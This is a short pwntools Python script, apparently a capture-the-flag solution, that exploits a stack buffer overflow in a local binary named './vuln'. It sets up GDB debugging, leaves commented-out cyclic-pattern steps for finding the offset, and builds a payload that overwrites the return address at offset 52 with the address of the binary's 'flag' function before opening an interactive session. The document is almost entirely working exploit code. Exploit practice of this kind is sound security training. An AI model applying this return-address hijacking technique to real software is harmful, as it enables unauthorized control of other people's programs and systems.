from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
# init-peda
# break
b *0x080491aa
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
# context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# io = start()
# io.sendline(cyclic(400))
# io.wait_for_close()
# print(io.corefile)
# print(cyclic_find('naaa'))

offset=52

PAYLOAD = flat({
    52: elf.symbols.flag
    # 52: 'AAAA'
})


io = start()
io.sendline(PAYLOAD)
# io.wait_for_close()
io.interactive()
